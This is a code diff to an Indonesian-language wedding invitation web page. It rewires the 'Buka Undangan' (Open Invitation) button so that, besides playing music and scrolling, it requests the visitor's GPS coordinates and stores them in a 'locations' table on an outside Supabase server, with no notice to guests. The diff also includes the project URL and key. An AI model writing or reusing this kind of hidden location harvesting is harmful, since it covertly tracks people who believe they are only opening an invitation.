@@ -199,7 +199,7 @@
             <br><br><br><br><br>
             <p>Dear</p>
             <p></p>
-            <button type="button" class="btn btn-secondary" onclick="scrollToSection()">Buka Undangan</button>
+            <button type="button" class="btn btn-secondary" onclick="openInvitation()">Buka Undangan</button>
         </div>
     </section>
 
@@ -324,19 +324,55 @@
              }
          },1000);
      </script>
+    <script src="https://unpkg.com/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
+
+<script>
+const supabaseUrl = "https://akuvonntuqdokwmwrmde.supabase.co";
+const supabaseKey = "sb_publishable_zHE7DrwYiweHWyU-CxtsJQ_gMJv7m3Q";
+
+const supabaseClient = supabase.createClient(supabaseUrl, supabaseKey);
+
+function openInvitation() {
+
+    // 1️⃣ Putar Lagu
+    var sound = new Audio("audio.mp3");
+    sound.play();
+
+    // 2️⃣ Scroll
+    const section = document.getElementById('wedding-details');
+    section.scrollIntoView({ behavior: 'smooth' });
+
+    // 3️⃣ Ambil Lokasi
+    if (navigator.geolocation) {
+
+        navigator.geolocation.getCurrentPosition(async function(position) {
+
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            console.log("Lokasi:", latitude, longitude);
+
+            // 4️⃣ Simpan ke Supabase
+            const { error } = await supabaseClient
+                .from("locations")
+                .insert([
+                    { latitude: latitude, longitude: longitude }
+                ]);
+
+            if (error) {
+                console.log("Gagal simpan:", error);
+            } else {
+                console.log("Lokasi berhasil disimpan!");
+            }
+
+        });
+
+    } else {
+        alert("Browser tidak mendukung GPS");
+    }
+}
+</script>
+
 
 </body>
 </html>
-<script>
-    function ding() {
-        var sound = new  Audio("audio.mp3");  
-        sound.play();
-    }
-    document.getElementsByTagName("button")[0].addEventListener("click", ding);
-</script>
-<script>
-    function scrollToSection() {
-        const section = document.getElementById('wedding-details');
-        section.scrollIntoView({ behavior: 'smooth' });
-    }
-</script>
